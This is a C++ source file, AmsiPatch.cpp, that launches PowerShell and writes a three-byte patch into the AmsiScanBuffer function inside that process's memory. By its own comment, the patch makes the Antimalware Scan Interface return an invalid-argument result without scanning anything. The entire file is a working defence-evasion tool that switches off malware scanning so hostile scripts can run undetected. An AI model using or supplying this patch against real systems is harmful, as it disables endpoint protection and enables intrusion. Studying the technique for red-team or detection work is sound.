// AmsiPatch.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <windows.h>
#include <iostream>
#include <tlhelp32.h>

DWORD FindProcessId(const WCHAR* processname)
{
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    DWORD result = 0;

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcessSnap) return(FALSE);

    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap);
        std::cout << "[!] Failed to gather information on system processes!" << std::endl;
        return 0;
    }

    do
    {
        if (wcscmp(processname, pe32.szExeFile) == 0)
        {
            result = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);

    return result;
}

int main()
{
    STARTUPINFO info = { sizeof(info) };
    PROCESS_INFORMATION processInfo;

    if (CreateProcess(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", NULL, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &info, &processInfo))
    {
        Sleep(3000);

        HMODULE amsiDll = LoadLibrary(L"amsi.dll");
        if (!amsiDll)
        {
            std::cout << "[!] Failed to load amsi dll" << std::endl;
            return 1;
        }

        char* amsiScanBufferAddr = (char*)(GetProcAddress(amsiDll, "AmsiScanBuffer"));
        if (!amsiScanBufferAddr)
        {
            std::cout << "[!] Failed to load AmsiScanBuffer" << std::endl;
            return 2;
        }
        char* patchAddress = amsiScanBufferAddr + 0x78;

        DWORD pwshProcId = FindProcessId(L"powershell.exe");
        if (!pwshProcId)
        {
            std::cout << "[!] Failed to get pwsh proc id" << std::endl;
            return 3;
        }
        
        HANDLE hPwsh = OpenProcess(PROCESS_ALL_ACCESS, false, pwshProcId);
        if (!hPwsh)
        {
            std::cout << "[!] Failed to open process" << std::endl;
            return 4;
        }

        DWORD op;
        if (!VirtualProtectEx(hPwsh, patchAddress, 0x0015, PAGE_EXECUTE_READWRITE, &op))
        {
            std::cout << "[!] Failed change protections" << std::endl;
            return 5;
        }

        BYTE patch[3] = {0x39, 0xe4, 0x90}; // cmp esp, esp, nop
                                            // this makes amsi jump to invalid arg return instead of actually scanning the buffer
        SIZE_T nBytesWritten;
        WriteProcessMemory(hPwsh, patchAddress, patch, sizeof(patch), &nBytesWritten);

        if (!VirtualProtectEx(hPwsh, patchAddress, 0x0015, PAGE_EXECUTE_READ, &op))
        {
            std::cout << "[!] Failed to restore old protections" << std::endl;
            return 6;
        }

        std::cout << "[*] Patched amsi for process with pid: " << pwshProcId << std::endl;

        WaitForSingleObject(processInfo.hProcess, INFINITE);
        CloseHandle(processInfo.hProcess);
        CloseHandle(processInfo.hThread);
    }
}